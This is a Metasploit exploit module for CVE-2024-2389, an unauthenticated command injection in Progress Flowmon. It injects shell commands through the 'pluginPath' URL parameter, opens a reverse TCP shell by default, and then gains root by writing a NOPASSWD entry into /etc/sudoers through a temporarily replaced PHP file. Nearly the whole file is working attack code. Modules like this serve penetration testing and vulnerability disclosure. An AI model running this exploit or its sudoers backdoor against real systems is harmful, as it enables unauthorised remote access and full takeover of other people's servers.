##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
  
    include Msf::Exploit::Remote::HttpClient
    prepend Msf::Exploit::Remote::AutoCheck
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Flowmon Unauthenticated Command Injection',
          'Description' => %q{
            This module exploits an unauthenticated command injection vulnerability in Progress Flowmon
            versions before v12.03.02.
          },
          'Author' => [
            'Dave Yesland with Rhino Security Labs', # Vulnerability discovery and Metasploit Module
          ],
          'License' => MSF_LICENSE,
          'References' => [
            ['CVE', 'CVE-2024-2389'],
            ['URL', 'https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability']
          ],
          'DisclosureDate' => '2024',
          'Notes' => {
            'Stability' => [ CRASH_SAFE ],
            'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK],
            'Reliability' => [ REPEATABLE_SESSION ]
          },
          'Platform' => ['unix', 'linux'],
          'Arch' => [ARCH_X86, ARCH_X64],
          'Targets' => [['Automatic', {}]],
          'Privileged' => false,
          'DefaultOptions' =>
          {
            'PAYLOAD' => 'cmd/linux/https/x64/shell/reverse_tcp',
            'SSL' => true,
            'RPORT' => 443
          },
        )
      )
  
      register_options([
        OptString.new('TARGETURI', [true, 'The URI path to Flowmon', '/']),
        OptBool.new('PRIVESC', [true, 'Automatically try privesc to add sudo entry', true])
      ])
    end
  
    def execute_command(cmd)
      send_request_cgi(
        'uri' => normalize_uri(datastore['TARGETURI'], 'service.pdfs', 'confluence'),
        'method' => 'GET',
        'vars_get' => {
          'file' => 'x',
          'lang' => 'x',
          'pluginPath' => "$(#{cmd})"
        }
      )
    end
  
    def exploit
      print_status('Attempting to execute payload...')
      execute_command(payload.encoded)
    end
  
    def on_new_session(session)
      if datastore['PRIVESC']
          execute_privesc_command(session)
      else
          print_status('Privilege escalation skipped.')
      end
    end
  
    def execute_privesc_command(session)
      print_status("Executing privilege escalation command...")
      session.shell_command('cp /var/www/shtml/index.php /tmp/index.php.bak;')
      session.shell_command('echo \'<?php system("echo \\"ADMINS ALL=(ALL) NOPASSWD: ALL\\" >> /etc/sudoers"); ?>\' > /var/www/shtml/index.php;')
      session.shell_command('sudo /usr/bin/php /var/www/shtml/index.php Cli\\:AddNewSource s;')
      session.shell_command('cp /tmp/index.php.bak /var/www/shtml/index.php;')
      print_status('You should be able to use "sudo -i" for a root shell...')
    end
  
    def check
      print_status("Checking if #{peer} can be exploited!")
    
      uri = normalize_uri(target_uri.path, 'homepage/auth/login')
      res = send_request_cgi(
        'uri'    => uri,
        'method' => 'GET'
      )
    
      unless res
        print_error("Connection failed")
        return CheckCode::Unknown
      end
    
      # Use a regular expression to extract the version number from the response
      version = res.body.match(/\/favicon\.ico\?v=([\d.]+)/)
    
      unless version && version[1]
        print_error("Unable to determine the version from the favicon link.")
        return CheckCode::Unknown
      end
    
      print_status("Detected version: #{version[1]}")
    
      if Rex::Version.new(version[1]) <= Rex::Version.new('12.03.02')
        print_good("Version #{version[1]} is vulnerable.")
        return CheckCode::Vulnerable
      else
        print_error("Version #{version[1]} is not vulnerable.")
        return CheckCode::Safe
      end
    end
  end